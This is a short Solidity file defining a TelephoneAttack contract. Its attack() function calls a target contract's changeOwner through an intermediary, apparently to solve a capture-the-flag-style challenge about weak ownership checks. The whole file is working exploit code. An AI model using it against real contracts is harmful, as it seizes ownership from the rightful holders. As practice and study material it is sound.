// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    ITelephone public target;

    constructor(address _address) {
        target = ITelephone(_address);
    }

    function attack(address _newOwner) public {
        target.changeOwner(_newOwner);
    }
}
